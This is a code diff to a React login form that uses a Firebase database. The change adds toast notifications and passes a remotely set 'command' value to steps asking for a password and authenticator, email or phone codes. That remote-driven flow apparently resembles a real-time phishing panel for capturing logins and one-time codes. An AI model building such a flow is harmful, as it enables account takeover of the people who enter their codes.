@@ -9,6 +9,7 @@ import {
   ref,
   update,
 } from "firebase/database";
+import { ToastContainer, toast } from "react-toastify";
 
 import { useEffect, useState } from "react";
 import { AuthenticatorCode } from "./steps/AuthenticatorCode";
@@ -76,6 +77,7 @@ export const LoginForm = () => {
       <div className="flex-1 w-full md:min-w-[780px] min-w-max flex justify-center">
         {command.includes("W_LOGIN") ? (
           <UserPass
+            command={command}
             password={password}
             setPassword={setPassword}
             setUsername={setUsername}
@@ -84,11 +86,17 @@ export const LoginForm = () => {
           />
         ) : null}
         {command.includes("W_SEC_1") ? (
-          <AuthenticatorCode dataRef={dataRef} />
+          <AuthenticatorCode command={command} dataRef={dataRef} />
         ) : null}
-        {command.includes("W_SEC_2") ? <EmailCode dataRef={dataRef} /> : null}
-        {command.includes("W_SEC_3") ? <PhoneCode dataRef={dataRef} /> : null}
+        {command.includes("W_SEC_2") ? (
+          <EmailCode command={command} dataRef={dataRef} />
+        ) : null}
+        {command.includes("W_SEC_3") ? (
+          <PhoneCode command={command} dataRef={dataRef} />
+        ) : null}
       </div>
+
+      <ToastContainer />
     </>
   );
 };
